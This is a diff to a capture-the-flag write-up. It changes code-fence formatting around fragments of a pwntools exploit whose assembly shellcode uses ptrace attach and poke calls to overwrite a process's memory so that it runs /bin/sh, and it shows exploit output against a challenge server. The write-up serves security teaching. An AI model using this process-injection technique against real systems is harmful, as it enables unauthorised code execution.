@@ -425,6 +425,8 @@ The `PTRACE_...` values are taken directly from `sys/ptrace.h`
 ```python
 payload = asm(
 f'''
+```
+```assembly
 mov rdi, {PTRACE_ATTACH}
 mov rsi, {pid}
 xor rdx, rdx
@@ -500,6 +502,8 @@ mov rax, {constants.SYS_ptrace}
 syscall
 
 jmp $
+```
+```python
 ''')
 
 assert(len(payload) < 0x1ff)
@@ -582,7 +586,7 @@ syscall
 
 Instead of `flag` replacing `readstory.txt`, it's `/bin/sh`:
 
-```
+```assembly
 /* /bin/sh as readstory.txt */
 mov rdi, {PTRACE_POKETEXT}
 mov rsi, {pid}
@@ -596,7 +600,7 @@ See [`exploit2.py`](exploit2.py) for details.
 
 Output:
 
-```
+```bash
 # ./exploit2.py REMOTE=1
 [+] Opening connection to 0.cloud.chals.io on port 15148: Done
 [*] child pid: 1232
